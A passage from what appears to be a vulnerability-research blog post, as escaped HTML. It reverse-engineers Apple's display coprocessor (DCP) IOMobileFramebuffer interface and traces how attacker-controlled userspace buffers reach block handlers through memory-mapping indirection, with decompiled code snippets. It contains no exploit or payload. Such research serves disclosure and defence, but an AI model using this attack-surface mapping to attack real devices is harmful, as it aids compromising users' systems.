HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-Z34Qgm9fUE2rzMwJWQ3j-w7InvtfHj5fs2qctSh0tTFmMbUpnrsQC4rUrhMf3_83uHAFinlM6xKqKXgUc2QR5IfL0gf4YEBM9Rqgrc6sNYsaCZ-JAe0PHlGa9VYcBgWfTqj5rTtin1mWTDG-I8K5M41EhA64KLNV54Sv9lvtbYIrkY2j37X6SniB/s1436/Screenshot%202022-06-22%20at%2016.53.47.png\" style=\"display: block; padding: 1em 0; text-align: center;\"&gt;&lt;img alt=\"The IDA Pro Names window showing a list of symbols like BLHA_15_getBlock_Impl.\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-Z34Qgm9fUE2rzMwJWQ3j-w7InvtfHj5fs2qctSh0tTFmMbUpnrsQC4rUrhMf3_83uHAFinlM6xKqKXgUc2QR5IfL0gf4YEBM9Rqgrc6sNYsaCZ-JAe0PHlGa9VYcBgWfTqj5rTtin1mWTDG-I8K5M41EhA64KLNV54Sv9lvtbYIrkY2j37X6SniB/s1200/Screenshot%202022-06-22%20at%2016.53.47.png\" style=\"max-height: 750; max-width: 600px;\" title=\"The IDA Pro Names window showing a list of symbols like BLHA_15_getBlock_Impl.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;You can perhaps see where this is going: that's looking like really quite a lot of reachable attack surface! Each of those &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span&gt;&amp;nbsp;functions is reachable by passing a different value for the first scalar argument to &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOConnectCallMethod&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;78&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;There's a little bit more reversing though to figure out how exactly to get controlled bytes to those &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;functions:&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"HovzfPYjjR-c8 HovzfPYjjR-c15\" id=\"h.7aa6aljwlb56\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;Memory Mapping&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The raw \"block\" input to each of those &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span&gt;&amp;nbsp;methods isn't passed inline in the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOConnectCallMethod&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure input. There's another level of indirection: each individual block handler structure has an array of supported \"subtypes\" which contains metadata detailing where to find the (userspace) pointer to that subtype's input data in the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOConnectCallMethod&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;structure input. The first dword in the structure input is the id of this subtype - in this case for the block handler type 19 the metadata array has a single entry:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&amp;lt;2, 0, 0x5F8, 0x600&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The first value (&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;2&lt;/span&gt;&lt;span&gt;) is the subtype id and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x5f8&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x600&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;tell the DCP from what offset in the structure input data to read a pointer and size from. The DCP then requests a memory mapping from the AP for that memory from the calling task:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.aba9dc90c6ed53b6789430b30f81bcfaea4d57c4\"&gt;&lt;/a&gt;&lt;a id=\"t.19\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;wrap_MemoryDescriptor&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;withAddressRange&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;addr_offset&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;size_offset&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;),&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; caller_task_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;We saw earlier that the AP sends the DCP the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;struct task&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer of the calling task; when the DCP requests a memory mapping from a user task it sends those raw task struct pointers back to the AP such that the kernel can perform the mapping from the correct task. The memory mapping is abstracted as an &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;MDES&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;object on the DCP side; the implementation of the mapping involves the DCP making an RPC to the AP:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.3170af9bf4e5590254e3fb8ce48d68439d2d1c04\"&gt;&lt;/a&gt;&lt;a id=\"t.20\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;make_link_call&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c22\"&gt;'D453'&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;req&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x20&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;resp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x14&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;which corresponds to a call to this method on the AP side:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.6497588dbb4a0e06e642bb1567a0fe45e731eabb\"&gt;&lt;/a&gt;&lt;a id=\"t.21\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;IOMFB&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;MemDescRelay&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;withAddressRange&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;long&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;long&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;long&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;long&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;long&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;long&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;long&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The DCP calls &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;::prepare&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;::map&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the returned &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;MDES&lt;/span&gt;&lt;span&gt;&amp;nbsp;object (exactly like an &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOMemoryDescriptor&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;object in IOKit), gets the mapped pointer and size to pass via a few final levels of indirection to the block handler:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.9bfd168ba40a9f143ab7f16183ab117679ba2dbc\"&gt;&lt;/a&gt;&lt;a id=\"t.22\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;a_descriptor_with_controlled_stuff&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;dispatcher_fptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; a_descriptor_with_controlled_stuff&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; block_type_handler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; important_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; important_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;where the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;dispatcher_fptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;looks like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.acd62f1b5ef2e8ae92523e3f984117951fec44d7\"&gt;&lt;/a&gt;&lt;a id=\"t.23\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;a_dispatcher&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;metadispatcher &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;disp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;block_handler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __int64 controlled_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;controlled_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;block_handler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler_setBlock&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;block_handler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;disp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;disp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;disp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;disp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;cnt_remaining_sclar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;disp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;handlers_holder&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;gate&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;controlled_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;controlled_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;You can see here just how useful it is to keep making structure definitions while reversing; there are so many levels of indirection that it's pretty much impossible to keep it all in your head.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;BlockHandler_setBlock&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a virtual method on &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;BLHA&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;This is the implementation for &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;BLHA&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;19:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.54f6196429ae58c591e0fbda962486be871b857c\"&gt;&lt;/a&gt;&lt;a id=\"t.24\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler19&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;setBlock&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span 